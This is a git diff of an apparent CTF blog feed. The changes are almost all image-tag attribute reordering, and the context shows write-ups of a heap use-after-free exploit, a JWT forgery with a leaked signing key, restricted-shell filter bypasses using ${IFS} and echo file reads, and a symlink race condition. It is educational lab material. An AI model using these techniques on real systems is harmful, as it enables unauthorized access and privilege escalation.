@@ -716,7 +845,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    PIE:      PIE enabled
 </span></span></code></pre></div><p>On voit donc qu&rsquo;on va s&rsquo;attaquer à un <em>ELF</em> en <em>64 bits</em> protégé par toutes les protections (comme dit dans la desc).</p>
 <p>On va le run pour avoir une idée de ce qu&rsquo;il fait:</p>
-<p><img alt="2023-05-01-191537_656x191_scrot" src="https://user-images.githubusercontent.com/77807503/235506504-7fc953da-3707-4499-b570-08c3526eec6e.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/235506504-7fc953da-3707-4499-b570-08c3526eec6e.png" alt="2023-05-01-191537_656x191_scrot"></p>
 <p>On a plusieurs options, mais on peut les rassembler en 3 catégories:</p>
 <ul>
 <li>Les options <strong>1</strong> et <strong>4</strong> vont a priori nous permettre d&rsquo;allouer des chunks (via <em>malloc</em>) pour créer le robot et le mode d&rsquo;emploi</li>
@@ -913,11 +1042,11 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span></code></pre></div><p>On voit qu&rsquo;elle va <em>print</em> du texte (plus ou moins inutile), appeller la fonction <code>move</code> de la struct &ldquo;Robot&rdquo;, en ensuite <strong>free le chunk</strong>. On remarque qu&rsquo;il ne supprime pas le <em>pointeur</em>, une fois que le robot est &ldquo;cassé&rdquo;, il existe toujours un pointeur vers le chunk qui a été <em>free()</em> et le contenu du chunk sera toujours existant.</p>
 <p>C&rsquo;est ici un cas assez classique de <strong>Use-After-Free</strong> (UAF). Il faut maintenant trouver un moyen de leak des valeurs de la <em>heap</em>.</p>
 <p>On peut commencer par regarder le chunk dans <code>pwndbg</code>. On lance le programme puis on crée un robot avec n&rsquo;importe quel nom:</p>
-<p><img alt="2023-05-01-193724_830x462_scrot" src="https://user-images.githubusercontent.com/77807503/235506542-72f6ef85-da08-4b99-aa76-c5f759805dd4.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/235506542-72f6ef85-da08-4b99-aa76-c5f759805dd4.png" alt="2023-05-01-193724_830x462_scrot"></p>
 <p>Maintenant, on fait <strong>CTRL+C</strong> pour interrompre le programme et pouvoir inspecter la <strong>heap</strong>. On va utiliser la commande <em>vis</em> et chercher notre chunk.</p>
-<p><img alt="2023-05-01-193807_1069x1036_scrot" src="https://user-images.githubusercontent.com/77807503/235506564-9c19d43e-f9fb-4c77-b9e5-40dc36fcb91e.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/235506564-9c19d43e-f9fb-4c77-b9e5-40dc36fcb91e.png" alt="2023-05-01-193807_1069x1036_scrot"></p>
 <p>Juste avant le <em>Top chunk</em>, on voit notre <em>Robot</em>, qu&rsquo;on reconnaît graĉe au &ldquo;ChatGPT&rdquo; (le nom donné au robot). On peut donc aussi voir que le chunk ne contient pas seulement le nom du robot, deux autres adresses s&rsquo;y trouvent - on va voir à quoi elles correspondent.</p>
-<p><img alt="2023-05-01-193935_1082x180_scrot" src="https://user-images.githubusercontent.com/77807503/235506579-0b63fc28-4acd-424c-b3dd-eb183e7b732c.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/235506579-0b63fc28-4acd-424c-b3dd-eb183e7b732c.png" alt="2023-05-01-193935_1082x180_scrot"></p>
 <p>Il s&rsquo;agit des deux fonctions de la <em>Struct</em> ajoutées au moment où on crée notre Robot. Ce sont ces adresses que nous voulont <em>leak</em>.</p>
 <p>Pour le faire, les options <strong>4</strong> et <strong>5</strong> vont nous être utiles. L&rsquo;option <strong>4</strong> nous permet de <em>malloc</em> un chunk d&rsquo;une taille de <strong>32</strong>, et puisque nous savons que nous avons un <strong>Use-After-Free</strong>, ce chunk prendra la place dans l&rsquo;ancien chunk <em>Robot</em> si le robot est détruit avant la création du manuel. Enfin, on pourra lire le manuel avec l&rsquo;option <strong>5</strong>, et puisque cette option lit <em>32 chars</em>, elle va aussi lire les deux adresses qui étaient présentes après le nom du robot.</p>
 <h3 id="tldr-leak">TLDR: Leak</h3>
@@ -1008,7 +1137,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
 </span></span></code></pre></div><p>On commence par créer quelques fonctions qui nous facilitent la communication avec l&rsquo;executable, puis on récupère le leak dans une variable. On peut vérifier le bon fonctionnement du script avec <code>pwndbg</code>:</p>
-<p><img alt="2023-05-01-195650_1363x191_scrot" src="https://user-images.githubusercontent.com/77807503/235506603-b7a42176-5182-4dca-96a5-725d28c91942.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/235506603-b7a42176-5182-4dca-96a5-725d28c91942.png" alt="2023-05-01-195650_1363x191_scrot"></p>
 <p>Le script crée un robot avec un nom de <strong>16</strong> chars, le détruit, puis crée un mode d&rsquo;emploi de <strong>16</strong> chars (pour ne pas réecrire les adresses des variables), et lis le manuel pour avoir les <em>leaks</em>. On voit que l&rsquo;adresse affichée est bien celle de la fonction <em>roll</em>.</p>
 <p>En faisant cette fonction, on comprend quelle est la deuxième partie de l&rsquo;exploit: réecrire la valeur d&rsquo;une fonction pour l&rsquo;appeller et obtenir le flag. Mais alors, quelle fonction <strong>de la struct</strong> réecrire, et par quoi?</p>
 <p>L&rsquo;option <strong>2</strong> nous permet de &ldquo;faire parler le robot&rdquo;, concrètement, elle appelle la fonction <code>makeNoise</code>, ce serait donc un bon candidat à réecrire puisqu&rsquo;il ne se passe rien de plus dans cette option.</p>
@@ -1242,29 +1371,28 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span></code></pre></div><p><a href="https://artifacts.picoctf.net/c/480/bookshelf-pico.zip"><code>source_code.zip</code></a></p>
 <h2 id="recon">Recon</h2>
 <p>When we go to the website, we see this login form and we can also create an account, but we won&rsquo;t need to because we&rsquo;re given credentials in the challenge description.</p>
-<p><img alt="2023-03-30-180704_1881x426_scrot" src="https://user-images.githubusercontent.com/77807503/228906618-f7e07832-594b-4ec8-a484-bdc170d9062f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906618-f7e07832-594b-4ec8-a484-bdc170d9062f.png" alt="2023-03-30-180704_1881x426_scrot"></p>
 <p>Once we&rsquo;re logged in, we get redirected to the website&rsquo;s main page. There are three books, a <em>free</em> one, a <em>premium</em> one and an <em>admin</em> one which is the flag.</p>
-<p><img alt="2023-03-30-180819_1888x1030_scrot" src="https://user-images.githubusercontent.com/77807503/228906658-76f5a884-458d-4079-af6d-04c83c50fd68.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906658-76f5a884-458d-4079-af6d-04c83c50fd68.png" alt="2023-03-30-180819_1888x1030_scrot"></p>
 <p>Alright, let&rsquo;s take a look around the website and its source code to see if we can find any interesting stuff&hellip;</p>
 <p>In the <strong>local storage</strong>, we find an <code>auth-token</code> and a <code>token-payload</code> keys:</p>
-<p><img alt="2023-03-30-181052_1667x78_scrot" src="https://user-images.githubusercontent.com/77807503/228906671-36740450-8abd-417c-8bfd-e43591495c3a.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906671-36740450-8abd-417c-8bfd-e43591495c3a.png" alt="2023-03-30-181052_1667x78_scrot"></p>
 <p>The <code>token-payload</code> looks like it specifies our <em>role</em>, which is supposedly the value we should change to become <em>admin</em>, let&rsquo;s try to change it manually and refresh the page:</p>
-<p><img alt="2023-03-30-181253_251x286_scrot" src="https://user-images.githubusercontent.com/77807503/228906726-ff512dad-6763-4368-9bda-e377a220aa1d.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906726-ff512dad-6763-4368-9bda-e377a220aa1d.png" alt="2023-03-30-181253_251x286_scrot"></p>
 <p>At the top right corner of the page, the &ldquo;<em>Free</em>&rdquo; became &ldquo;<em>Admin</em>&rdquo; and we now have access to the <strong>Admin Dashboard</strong>, let&rsquo;s take a look at this:</p>
-<p><img alt="2023-03-30-181357_1877x516_scrot" src="https://user-images.githubusercontent.com/77807503/228906770-517f3a75-64fc-41c8-8ff8-52527432ce72.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906770-517f3a75-64fc-41c8-8ff8-52527432ce72.png" alt="2023-03-30-181357_1877x516_scrot"></p>
 <p>It seems we can delete the books, but that&rsquo;s not what we want to do, we only need to read the <em>Flag</em> book&hellip; maybe we can now read it since we&rsquo;re an <em>admin</em> ?</p>
-<p><img alt="2023-03-30-181505_287x82_scrot" src="https://user-images.githubusercontent.com/77807503/228906785-75bdcb23-09ff-4a2e-856f-dd7de1854c4a.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906785-75bdcb23-09ff-4a2e-856f-dd7de1854c4a.png" alt="2023-03-30-181505_287x82_scrot"></p>
 <p>Of course not ! That would have been way too easy&hellip; Time to take a look at this jwt:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4c
 </span></span><span style="display:flex;"><span>CI6MTY4MDc5NzI5NCwiaWF0IjoxNjgwMTkyNDk0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.LsB8gkkevf
 </span></span><span style="display:flex;"><span>0hJiLP6HOTdzvakaT_yRXofg3mH_gTJls
 </span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
-<p><img alt="2023-03-30-181624_1196x680_scrot" src="https://user-images.githubusercontent.com/77807503/228906810-1feeddc4-2f88-477e-b591-f497f8a2e2ee.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906810-1feeddc4-2f88-477e-b591-f497f8a2e2ee.png" alt="2023-03-30-181624_1196x680_scrot"></p>
 <p>By pasting it into <a href="https://jwt.io">https://jwt.io</a>, we learn a little bit more about what is stored in this token. It seems like the <code>token-payload</code> actually corresponds to the <code>JWT</code>&rsquo;s payload (obviously).</p>
 <p>Alright, so we can assume we also need to modify the <code>JWT</code> to modify our role..</p>
 <blockquote>
-<p>I&rsquo;ve tried the basic exploits such as <em>None</em> alg and cracking the but none of them worked</p>
-</blockquote>
+<p>I&rsquo;ve tried the basic exploits such as <em>None</em> alg and cracking the but none of them worked</p></blockquote>
 <p>Time to take a look at the source code !</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">.</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> build<span style="color:#f92672">.</span>gradle
@@ -1438,8 +1566,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>This is the <em>key</em> used to sign all the generated <code>JWTs</code>, with this, we can create and modify <code>JWT</code> as we want, and thus we can modify our <em>role</em> on the website.</p>
 <blockquote>
-<p>Strangely the key is also visible in the <code>SecretGenerator.java</code> file:</p>
-</blockquote>
+<p>Strangely the key is also visible in the <code>SecretGenerator.java</code> file:</p></blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> io.github.nandandesai.pico.security;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io.github.nandandesai.pico.configs.UserDataPaths;
@@ -1489,27 +1616,26 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>Now that we have the key, we can modify our <em>token</em> with the <em>admin</em> role and sign it with the key <em>1234</em>.</p>
 <blockquote>
-<p>Be careful, you should also change the <code>userId</code> field to <code>0</code> since the admin&rsquo;s <code>userId</code> is not <code>1</code></p>
-</blockquote>
-<p><img alt="2023-03-30-183618_1194x787_scrot" src="https://user-images.githubusercontent.com/77807503/228906908-84ac83e7-d690-400b-b8ba-f7d4d46cdf79.png"></p>
+<p>Be careful, you should also change the <code>userId</code> field to <code>0</code> since the admin&rsquo;s <code>userId</code> is not <code>1</code></p></blockquote>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906908-84ac83e7-d690-400b-b8ba-f7d4d46cdf79.png" alt="2023-03-30-183618_1194x787_scrot"></p>
 <p>We can now copy the new token and modify the <code>auth-token</code> key value with it, then refresh the page and we should be <em>admin</em> !</p>
-<p><img alt="2023-03-30-183151_1877x668_scrot" src="https://user-images.githubusercontent.com/77807503/228906936-fbc5429e-c1f9-484f-890e-db4b317461fc.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906936-fbc5429e-c1f9-484f-890e-db4b317461fc.png" alt="2023-03-30-183151_1877x668_scrot"></p>
 <p>It seems like it worked, because the <strong>Admin Dashboard</strong> looks different, we can now modify users.</p>
 <p>Let&rsquo;s try to read the <em>Flag book</em> !</p>
-<p><img alt="2023-03-30-183235_279x65_scrot" src="https://user-images.githubusercontent.com/77807503/228906964-b40231fb-b6e4-493b-95c5-ff6fc4b50f32.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228906964-b40231fb-b6e4-493b-95c5-ff6fc4b50f32.png" alt="2023-03-30-183235_279x65_scrot"></p>
 <p>Whaaat? Why?</p>
 <p>I don&rsquo;t know, but we can try to modify the &ldquo;<em>User</em>&rdquo; user&rsquo;s permissions to <em>Admin</em> and see if <em>he</em> can read the book:</p>
-<p><img alt="2023-03-30-183347_1360x353_scrot" src="https://user-images.githubusercontent.com/77807503/228907040-d44ddbe1-6cb4-44ca-9f1b-03211b5dc33f.png"></p>
-<p><img alt="2023-03-30-183501_306x65_scrot" src="https://user-images.githubusercontent.com/77807503/228907066-4cac6dc5-4bae-4a68-b1c3-289fc53b3c25.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228907040-d44ddbe1-6cb4-44ca-9f1b-03211b5dc33f.png" alt="2023-03-30-183347_1360x353_scrot"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228907066-4cac6dc5-4bae-4a68-b1c3-289fc53b3c25.png" alt="2023-03-30-183501_306x65_scrot"></p>
 <p>Now we can clear our <em>Local Storage</em> so the <em>JWT</em> we created gets refreshed and we should be able to read the <em>Flag</em>&hellip;</p>
-<p><img alt="2023-03-30-183813_1888x1030_scrot" src="https://user-images.githubusercontent.com/77807503/228907160-077c5e8a-ffe7-4dd7-b896-b45a99b56922.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228907160-077c5e8a-ffe7-4dd7-b896-b45a99b56922.png" alt="2023-03-30-183813_1888x1030_scrot"></p>
 <p>And it worked ! GGs !</p>
 <h2 id="ctf-conclusion">CTF Conclusion</h2>
 <p>That writeup will be my last one for this edition of the CTF (because I don&rsquo;t think making a writeup on the other challenges I&rsquo;ve flagged is useful)</p>
 <p>This was a very fun CTF - even though I would have enjoyed more <code>pwn</code> challenges :c</p>
 <p>Me and my team ended up <strong>404/6924</strong> which is great ! Thanks to all my mates and to the organizers, see you next year !</p>
-<p><img alt="2023-03-28-201238_1888x1030_scrot" src="https://user-images.githubusercontent.com/77807503/228907187-09b35317-6a5f-48f4-9610-ac767af96c5e.png"></p>
-<p><img alt="2023-03-28-201252_1888x1030_scrot" src="https://user-images.githubusercontent.com/77807503/228907199-34db4a2f-b1ce-4b8c-a236-d96ea3c14992.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228907187-09b35317-6a5f-48f4-9610-ac767af96c5e.png" alt="2023-03-28-201238_1888x1030_scrot"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228907199-34db4a2f-b1ce-4b8c-a236-d96ea3c14992.png" alt="2023-03-28-201252_1888x1030_scrot"></p>
 ]]></content>
         </item>
         
@@ -1550,27 +1676,26 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span></code></pre></div><h2 id="poking-around">Poking around</h2>
 <p>We&rsquo;re given a username, a password and a port so we can <code>ssh</code> to the machine, so let&rsquo;s do it</p>
 <p>Once we&rsquo;re connected, the first thing we notice is this:</p>
-<p><img alt="2023-03-28-192950_150x64_scrot" src="https://user-images.githubusercontent.com/77807503/228326701-3499cd16-19a3-4251-acb0-81d26b41d09b.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228326701-3499cd16-19a3-4251-acb0-81d26b41d09b.png" alt="2023-03-28-192950_150x64_scrot"></p>
 <p>Instead of the classic <code>username@hostname:~$</code>, it&rsquo;s written <code>Special$</code>. That indicates that we&rsquo;re not on a <em>typical</em> bash shell.</p>
 <p>Let&rsquo;s start poking around to see what we <em>can</em> and <em>can&rsquo;t</em> do. We&rsquo;ll start by trying <code>whoami</code>, <code>pwd</code> and <code>ls</code>:</p>
-<p><img alt="2023-03-28-193349_239x233_scrot" src="https://user-images.githubusercontent.com/77807503/228326731-0db2b74c-d35c-4dc5-be54-eb2424d8e161.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228326731-0db2b74c-d35c-4dc5-be54-eb2424d8e161.png" alt="2023-03-28-193349_239x233_scrot"></p>
 <p>As you can see, there is some kind of spell checker that prevents us from executing commands (<em>pwd</em> becomes <em>Pod</em>, <em>whoami</em> becomes <em>Whom</em> etc&hellip;).</p>
 <h2 id="bypassing-the-filter">Bypassing the filter</h2>
 <p>Let&rsquo;s try executing <code>ls</code> again but inside of a <a href="https://blog.wplauncher.com/what-is-in-linux/">command substitution</a>:</p>
-<p><img alt="2023-03-28-193630_257x73_scrot" src="https://user-images.githubusercontent.com/77807503/228326750-58da2eb2-e9c2-4559-a124-d76aacd1f6a3.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228326750-58da2eb2-e9c2-4559-a124-d76aacd1f6a3.png" alt="2023-03-28-193630_257x73_scrot"></p>
 <p>This time, it says that <em>blargh</em> wasn&rsquo;t found&hellip; weird, did our <em>ls</em> become <em>blargh</em> ?</p>
 <p>No, since <em>command subsitution</em> returns the output of the command, <em>blargh</em> is actually the first folder returned by the <code>ls</code>.</p>
 <p>Alright, the next step is knowing what&rsquo;s inside of it, let&rsquo;s try the same trick:</p>
-<p><img alt="2023-03-28-193844_370x70_scrot" src="https://user-images.githubusercontent.com/77807503/228326794-39c25852-928b-4f33-b556-b39add3f7033.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228326794-39c25852-928b-4f33-b556-b39add3f7033.png" alt="2023-03-28-193844_370x70_scrot"></p>
 <p>And that didn&rsquo;t work&hellip; It seems that the space messed up the command, but hopefully there is a trick to avoid putting spaces in the command: <a href="https://www.oreilly.com/library/view/learning-linux-shell/9781785286216/ch08s13.html">The IFS environment variable</a></p>
 <p>Let&rsquo;s see if it works when we replace our space by <code>$IFS</code>:</p>
 <blockquote>
-<p>To prevent the variable from becoming <code>$IFSblargh</code> when we call it, we can <a href="https://stackoverflow.com/questions/27472540/difference-between-and-in-bash">put it in brackets</a></p>
-</blockquote>
-<p><img alt="2023-03-28-194235_278x69_scrot" src="https://user-images.githubusercontent.com/77807503/228326832-c4a3346f-3e57-4c50-b9c7-9c8d05feee44.png"></p>
+<p>To prevent the variable from becoming <code>$IFSblargh</code> when we call it, we can <a href="https://stackoverflow.com/questions/27472540/difference-between-and-in-bash">put it in brackets</a></p></blockquote>
+<p><img src="https://user-images.githubusercontent.com/77807503/228326832-c4a3346f-3e57-4c50-b9c7-9c8d05feee44.png" alt="2023-03-28-194235_278x69_scrot"></p>
 <p>Alright, it worked and we now know where the flag is !</p>
 <p>The last step is reading the content of <code>flag.txt</code>, which shouldn&rsquo;t be a problem since we now know how to avoid using spaces:</p>
-<p><img alt="2023-03-28-194430_611x77_scrot" src="https://user-images.githubusercontent.com/77807503/228326865-b18d1a81-3200-49da-bec4-bf8cd58b27b0.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228326865-b18d1a81-3200-49da-bec4-bf8cd58b27b0.png" alt="2023-03-28-194430_611x77_scrot"></p>
 <p>And we got it ! GGs</p>
 ]]></content>
         </item>
@@ -1595,7 +1720,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -p 53888 ctf-player@saturn.picoctf.net. The password is *****
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;poking-around&#34;&gt;Poking around&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&#34;2023-03-28-202047_139x26_scrot&#34; src=&#34;https://user-images.githubusercontent.com/77807503/228334746-be91a5d6-6f85-4359-b602-bab18110617e.png&#34;&gt;&lt;/p&gt;</description>
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/228334746-be91a5d6-6f85-4359-b602-bab18110617e.png&#34; alt=&#34;2023-03-28-202047_139x26_scrot&#34;&gt;&lt;/p&gt;</description>
             <content type="html"><![CDATA[<h2 id="note">Note</h2>
 <p><em>Specialer</em> was <em>an even funnier</em> challenge from the <em>general skills</em> category (which is PicoCTF&rsquo;s <em>misc</em> category).</p>
 <p>It was based on the same principle as the <em>Special</em> challenge, bypassing a bash shell filter to read the flag.</p>
@@ -1610,10 +1735,10 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>ssh -p 53888 ctf-player@saturn.picoctf.net. The password is *****
 </span></span></code></pre></div><h2 id="poking-around">Poking around</h2>
-<p><img alt="2023-03-28-202047_139x26_scrot" src="https://user-images.githubusercontent.com/77807503/228334746-be91a5d6-6f85-4359-b602-bab18110617e.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228334746-be91a5d6-6f85-4359-b602-bab18110617e.png" alt="2023-03-28-202047_139x26_scrot"></p>
 <p>Same as for the previous challenge, this indicates that we are not on a <em>typical</em> shell.</p>
 <p>Let&rsquo;s start poking around to see what we <em>can</em> and <em>can&rsquo;t</em> do. We&rsquo;ll start by trying <code>whoami</code>, <code>pwd</code> and <code>ls</code>:</p>
-<p><img alt="2023-03-28-202313_340x142_scrot" src="https://user-images.githubusercontent.com/77807503/228334765-40458e85-d3be-4ffb-a34f-1f2f89264b0a.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228334765-40458e85-d3be-4ffb-a34f-1f2f89264b0a.png" alt="2023-03-28-202313_340x142_scrot"></p>
 <p>As you can see, only <code>pwd</code> works. This command is not useful but it shows that there is no filter, some commands are just not available.</p>
 <p>To list all the available commands, we can use the <code>compgen -c</code> command.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;...&gt;
@@ -1642,22 +1767,20 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span></code></pre></div><h2 id="bypassing-the-filter">Bypassing the filter</h2>
 <p>Among all of these, we can see one very interesting command: <code>echo</code>.</p>
 <p>Indeed, we can use <code>echo</code> to act as a <code>ls</code> by doing <code>echo *</code>:</p>
-<p><img alt="2023-03-28-202552_177x43_scrot" src="https://user-images.githubusercontent.com/77807503/228334799-5dc7e5fd-fabc-4505-9adc-f44b5923e956.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228334799-5dc7e5fd-fabc-4505-9adc-f44b5923e956.png" alt="2023-03-28-202552_177x43_scrot"></p>
 <blockquote>
-<p>Fun fact: Since we have access to the <code>alias</code> command, we can make an alias for <code>ls</code> to artificially make it work again:</p>
-</blockquote>
-<p><img alt="2023-03-28-202627_284x68_scrot" src="https://user-images.githubusercontent.com/77807503/228334826-65a55a9d-d883-4e93-9e8a-1d234e2236c4.png"></p>
+<p>Fun fact: Since we have access to the <code>alias</code> command, we can make an alias for <code>ls</code> to artificially make it work again:</p></blockquote>
+<p><img src="https://user-images.githubusercontent.com/77807503/228334826-65a55a9d-d883-4e93-9e8a-1d234e2236c4.png" alt="2023-03-28-202627_284x68_scrot"></p>
 <p>We see three folders: <code>abra</code>, <code>ala</code> and <code>sim</code>.</p>
 <p>Since we have access to the <code>cd</code> command, we can use it to go into them and list their content.</p>
 <p>Let&rsquo;s try to list the content of the <code>ala</code> folder:</p>
-<p><img alt="2023-03-28-202910_197x67_scrot" src="https://user-images.githubusercontent.com/77807503/228334862-c8db64e5-09c2-4097-9720-403cebabb0db.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228334862-c8db64e5-09c2-4097-9720-403cebabb0db.png" alt="2023-03-28-202910_197x67_scrot"></p>
 <p>There are two text files and we don&rsquo;t have access to <code>cat</code>, <code>head</code> or <code>tail</code>&hellip; but that&rsquo;s ok, because we have access to <code>echo</code> !</p>
 <p>Here is the trick to read a file with the <code>echo</code> command: <code>echo &quot;$(&lt;kazam.txt)&quot;</code></p>
-<p><img alt="2023-03-28-203032_681x44_scrot" src="https://user-images.githubusercontent.com/77807503/228334887-fc7cc2c0-33a3-4c4e-a039-319e498c9f5c.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228334887-fc7cc2c0-33a3-4c4e-a039-319e498c9f5c.png" alt="2023-03-28-203032_681x44_scrot"></p>
 <p>As you can see, it worked ! GGs</p>
 <blockquote>
-<p>There are other text files in the other directories, but they&rsquo;re just rabbit holes</p>
-</blockquote>
+<p>There are other text files in the other directories, but they&rsquo;re just rabbit holes</p></blockquote>
 ]]></content>
         </item>
         
@@ -1772,8 +1895,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><blockquote>
-<p>If you want to try this code locally, you can copy it and compile it using <code>g++</code></p>
-</blockquote>
+<p>If you want to try this code locally, you can copy it and compile it using <code>g++</code></p></blockquote>
 <p>This program is going to read the file passed as the first argument. First, it checks the file&rsquo;s status information, then, <strong>it checks if the user is the file&rsquo;s owner</strong>. If both these checks pass, it reads the content of the specified file.</p>
 <p>This is a very classic case of <em>Race Condition</em>. Our goal is to read <code>flag.txt</code>.</p>
 <p>Here&rsquo;s what we are going to do:</p>
@@ -1784,19 +1906,19 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </ul>
 <p>With a little luck, the loop will change the <em>symlink</em> right after the check is passed, and thus the program will read <code>flag.txt</code>.</p>
 <p>Alright, first, let&rsquo;s create the <code>fake_flag.txt</code> file and make our <em>symlink</em>.</p>
-<p><img alt="2023-03-17-182749_1914x325_scrot" src="https://user-images.githubusercontent.com/77807503/228324512-0a660668-a0b6-480c-9e85-588565d283fc.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228324512-0a660668-a0b6-480c-9e85-588565d283fc.png" alt="2023-03-17-182749_1914x325_scrot"></p>
 <p>By doing <code>ls -la</code>, we can see that our <code>exploit</code> is pointing to the <code>fake_flag.txt</code> file.</p>
 <p>Then, let&rsquo;s make our loop and put it in the background:</p>
-<p><img alt="2023-03-17-182949_1911x969_scrot" src="https://user-images.githubusercontent.com/77807503/228324640-ff779217-0745-4528-b91a-9caa51823e19.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228324640-ff779217-0745-4528-b91a-9caa51823e19.png" alt="2023-03-17-182949_1911x969_scrot"></p>
 <p>We can check it is working by running <code>ls -la</code> again and seeing if the <em>symlink</em> changes.</p>
 <p>Now, we could try to launch the process manually but that would be very annoying, so we can also make a loop for that:</p>
-<p><img alt="2023-03-17-183348_843x308_scrot" src="https://user-images.githubusercontent.com/77807503/228324689-c0346748-4a03-46db-a6fc-02c39fad40f8.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228324689-c0346748-4a03-46db-a6fc-02c39fad40f8.png" alt="2023-03-17-183348_843x308_scrot"></p>
 <p>This is not mandatory, but it just saves you time because you can&rsquo;t guess the timing for the check.</p>
 <p>Let&rsquo;s run this, and see if it works:</p>
-<p><img alt="2023-03-17-183510_993x982_scrot" src="https://user-images.githubusercontent.com/77807503/228324726-7e25cdd0-a5ef-4916-a7a6-5914c8bd78ca.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228324726-7e25cdd0-a5ef-4916-a7a6-5914c8bd78ca.png" alt="2023-03-17-183510_993x982_scrot"></p>
 <p>As you can see, it failed a lot of times but it worked once and that&rsquo;s all we need !</p>
 <p>Here&rsquo;s a scheme that recaps what happenned (if you can&rsquo;t see it, right click &amp; open image):</p>
-<p><img alt="Untitled Diagram drawio(1)" src="https://user-images.githubusercontent.com/77807503/228324757-daa63488-0b9b-4356-a71f-65a34e21de63.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/228324757-daa63488-0b9b-4356-a71f-65a34e21de63.png" alt="Untitled Diagram drawio(1)"></p>
 <h1 id="how-to-avoid-these-attacks">How to avoid these attacks</h1>
 <p>As I said it in the first part, this kind of attack is hard to detect and to mitigate. The root cause of many TOCTTOU vulnerabilities lies in the lack of concurrency control in an operating system&rsquo;s file-system API and so it&rsquo;s not a problem that&rsquo;s easy to resolve. The challenge therefore is ensuring the file system state, managed by the operating system, cannot change between two system calls.</p>
 <p>There is no global patch for these attacks, the first challenge is obviously to identify them, but patching them is rather hard. A technique could be <em>locking the file</em> before it is checked to ensure it&rsquo;s not getting modified during the process.</p>
